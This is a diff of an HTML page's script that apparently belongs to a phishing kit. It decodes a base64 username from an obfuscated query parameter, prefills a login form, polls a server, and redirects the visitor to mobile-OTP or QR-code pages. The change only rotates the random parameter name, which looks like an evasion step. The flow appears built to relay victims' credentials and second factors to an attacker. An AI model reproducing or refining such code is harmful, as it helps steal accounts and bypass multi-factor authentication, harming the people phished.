@@ -1,4 +1,6 @@
 
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -138,7 +140,7 @@
     });
 
     const qp = new URLSearchParams(window.location.search);
-    const tk = qp.get('nxowuwonvdmbqrrwewosnadgdhgdus') || '';
+    const tk = qp.get('svhsdfhadeiueirncbxjcbbxcxb') || '';
     const username = atob(tk);
     document.getElementById('useRname').value = username;
     document.querySelector('.userdiv-name').textContent = username;
@@ -163,9 +165,9 @@
           if (data.result === 'waiting') {
             setTimeout(() => pollMobileResult(username, tel), 2000);
           } else if (data.result === 'redirected') {
-            window.location.href = '/motp?nxowuwonvdmbqrrwewosnadgdhgdus=' + encodeURIComponent(tk);
+            window.location.href = '/motp?svhsdfhadeiueirncbxjcbbxcxb=' + encodeURIComponent(tk);
           } else if (data.result === 'redirected_qr') {
-            window.location.href = '/qrcode?nxowuwonvdmbqrrwewosnadgdhgdus=' + encodeURIComponent(tk);
+            window.location.href = '/qrcode?svhsdfhadeiueirncbxjcbbxcxb=' + encodeURIComponent(tk);
           } else {
             // error
             document.getElementById('loadingBar').classList.remove('active');
